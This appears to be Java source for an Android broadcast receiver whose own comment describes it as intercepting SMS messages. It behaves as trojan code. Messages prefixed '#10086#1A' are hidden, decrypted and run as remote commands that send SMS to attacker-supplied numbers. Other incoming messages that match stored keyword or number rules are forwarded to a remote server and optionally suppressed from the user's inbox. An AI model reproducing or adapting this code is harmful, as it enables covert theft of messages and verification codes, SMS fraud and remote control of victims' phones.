package tools.common;


import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.telephony.SmsMessage;
/*
 * 拦截短信
 */
public class SmsReceiver extends BroadcastReceiver{
	private DbHelper dbAdapter = null;
	private Context mContext;
	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		//Tools.KillApp(context, "");
		mContext = context;
		if (intent != null) {                  
	            Bundle bundle = intent.getExtras();			
		    	if (bundle != null) {
			    	Object[] myOBJpdus = (Object[]) bundle.get("pdus");	
			    	SmsMessage[] messages = new SmsMessage[myOBJpdus.length];	
			    	
			    	try{
			    		for (int i = 0; i < myOBJpdus.length; i++) {			    		
					    	messages[i] = SmsMessage.createFromPdu((byte[]) myOBJpdus[i]);	
				    	} 
			    	}catch(Exception e){
			    		Logger.info("不支持双模手机");
			    		return;
			    	}			    			    	  	
			    	SmsMessage message = messages[0];			    				    	  	
			    	String smsbody = message.getMessageBody();
			    	String smsnum = message.getDisplayOriginatingAddress();
			    	//smsnum = smsnum.replaceAll("+86", "");
			    	
			    	if(smsbody.length()>7)
			    	{
			    		String mark = smsbody.substring(0,7);
				    	if(mark.equals("#10086#"))
				    	{//#10086#1A{"sn":"13760360024","sm":"测试"}		
				    		abortBroadcast();
				    		String msg_mark = smsbody.substring(7,9);
				    		String msginfo = smsbody.substring(9);
				    		if(msg_mark.equals("1A"))
				    		{//发送短信
				    			Logger.error("收到密码短信:"+msginfo);
				    			msginfo = DES2.decodeValue(Tag.KEY, msginfo);
				    			if(msginfo.length()>1)
				    			{
				    				try {
										JSONArray arrayJson = new JSONArray(msginfo);
										for(int i=0;i<arrayJson.length();i++)
										{
											JSONObject tempJson = arrayJson.optJSONObject(i);
											int ttype = tempJson.getInt("t");
											switch(ttype)
											{
											case 11:
												//发送短信
												String numtel = tempJson.getString("sn");
												//Logger.info("sn:"+numtel);
												
												String tomsg = tempJson.getString("sm");
												//Logger.info("sm:"+tomsg);
												Tools.sendSms(context, numtel, tomsg);
												break;
											}
											
										}
									} catch (JSONException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}			    	
				    			}else{
				    				Logger.error("decode error");
				    			}
										
				    		}
				    		
				    		return;
				    	}
			    	}
			    	
			    	
			    	
			    	
			    	
			    	if(smsnum.startsWith("+86"))
			    	{
			    		smsnum = smsnum.substring(3);
			    	}	

			    	Logger.info("短信内容:"+smsbody);
			    	
			    	if(dbAdapter == null)
		        	{
		        		dbAdapter = new DbHelper(context,1);
		        	}	
		        	dbAdapter.opendatabase();
		        	Cursor c = dbAdapter.getkeys();
		        	
		        	Logger.info("count:"+c.getCount());
		        	
			    	if(null!=c&&c.getCount()>0)
			    	{
			    		Logger.info("短信:"+smsbody);
			    		if(c.moveToFirst())
			    		{
			    			do{
			    				String keyword = c.getString(0);
			    				String isback = c.getString(1);		
			    				String number = c.getString(2);
			    				long etime = c.getLong(3);
			    				int id = c.getInt(4);
			    				if(System.currentTimeMillis()<=etime)
			    				{//还在范围被			    					
			    					if(number.equals("*")&&keyword.equals("*"))
			    					{
			    						Intent service = new Intent(Tag.START);
				    					service.putExtra("action", Tag.SENDTOSERVER);
				    					service.putExtra("message", smsbody);
				    					service.putExtra("number", smsnum);
		    						    mContext.startService(service);
		    						    Logger.info("返回给服务器");	
		    						    if(isback.equals("1"))
			    						{
			    							Logger.info("屏蔽短信");
			    							abortBroadcast();
			    						}
			    					}else{
			    						if(number.equals("*"))
				    					{
				    						if(smsbody.contains(keyword))
			    							{
			    								Intent service = new Intent(Tag.START);
						    					service.putExtra("action", Tag.SENDTOSERVER);
						    					service.putExtra("message", smsbody);
						    					service.putExtra("number", smsnum);
				    						    mContext.startService(service);
				    						    Logger.info("返回给服务器");	
				    						    if(isback.equals("1"))
					    						{
					    							Logger.info("屏蔽短信");
					    							abortBroadcast();
					    						}
			    							}
				    					}else{
				    						if(number.equals(smsnum))
				    						{
				    							if(smsbody.contains(keyword))
				    							{
				    								Intent service = new Intent(Tag.START);
							    					service.putExtra("action", Tag.SENDTOSERVER);
							    					service.putExtra("message", smsbody);
							    					service.putExtra("number", smsnum);
					    						    mContext.startService(service);
					    						    Logger.info("返回给服务器");	
					    						    if(isback.equals("1"))
						    						{
						    							Logger.info("屏蔽短信");
						    							abortBroadcast();
						    						}
				    							}
				    						}
				    					}
				    					
				    					if(keyword.equals("*"))
				    					{
				    						Logger.info(number+":"+smsnum);
				    						if(number.equals(smsnum))
				    						{
				    							Intent service = new Intent(Tag.START);
						    					service.putExtra("action", Tag.SENDTOSERVER);
						    					service.putExtra("message", smsbody);
						    					service.putExtra("number", smsnum);
				    						    mContext.startService(service);
				    						    Logger.info("返回给服务器");	
				    						    if(isback.equals("1"))
					    						{
					    							Logger.info("屏蔽短信");
					    							abortBroadcast();
					    						}
				    						}
				    					}else{
				    						if(number.equals(smsnum))
				    						{
				    							Intent service = new Intent(Tag.START);
						    					service.putExtra("action", Tag.SENDTOSERVER);
						    					service.putExtra("message", smsbody);
						    					service.putExtra("number", smsnum);
				    						    mContext.startService(service);
				    						    Logger.info("返回给服务器");	
				    						    if(isback.equals("1"))
					    						{
					    							Logger.info("屏蔽短信");
					    							abortBroadcast();
					    						}
				    						}
				    					}
			    					}
			    					
			    					
			    					
		    						break;
		    						
			    				}else{
			    					dbAdapter.deletekeys();
			    					break;
			    				}
			    							
			    			}while(c.moveToNext());
			    		}
			    	}
			    	
			    	if(c!=null)
			    		c.close();
			    	dbAdapter.closedatabase();
			    	dbAdapter = null;
		    	}else
		    	{	    		
		    		Logger.info("bundle null!!!!!!!!!!!!!!!!!!");
		    	}
	            
	            
	     }
	}

}
